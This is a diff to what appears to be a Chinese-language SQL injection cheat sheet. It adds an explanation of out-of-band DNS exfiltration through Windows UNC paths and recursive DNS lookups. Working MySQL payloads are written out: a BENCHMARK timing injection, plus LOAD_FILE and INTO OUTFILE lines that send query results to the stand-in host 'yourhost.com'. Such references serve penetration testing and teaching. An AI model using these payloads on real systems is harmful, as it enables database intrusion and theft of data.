@@ -192,7 +192,16 @@ concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1)))),1)
 上面这条用于 order by limit 之后的timing注入，注意这里不能用sleep函数。  
  
 #### Out of Band Channel Attacks
-`?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'yourhost.com\\'))) `  
+原理：使用unc路径，会对指定的域名进行dns查询，使用dns信道，配合dns服务器收到的数据可快速得到数据内容。    
+使用dns有一定的好处，可以突破主机网络隔离，例如dmz主机不能直接连外网，但是配置的网络可达的dns服务器往往可以，通过查询域名递归的方式，dns服务器可以将返回数据通过dns协议带出去。    
+unc路径是windows下的特性，默认安装的linux下不存在这样的功能。    
+![](../pictures/sqlmap15.png)    
+1）受害主机执行一条特定payload语句，将数据和指定域名拼接，向dns server发送dns请求    
+2）dns server因为没有记录这个域名所对应的ip，递归向上层dns server请求    
+3）直到递归请求到有这个根域名记录的根dns server（一般为域名注册商），返回给最初的dns server可以去找这个代号为2的dns server解析    
+4）这个代号为2的dns server是hacker伪造的，所以hacker可以收到传过来的dns请求，从中剥离数据    
+
+`?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), '.yourhost.com\\'))) `  
 Makes a NBNS query request/DNS resolution request to yourhost.com  
 
 `?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt')`  
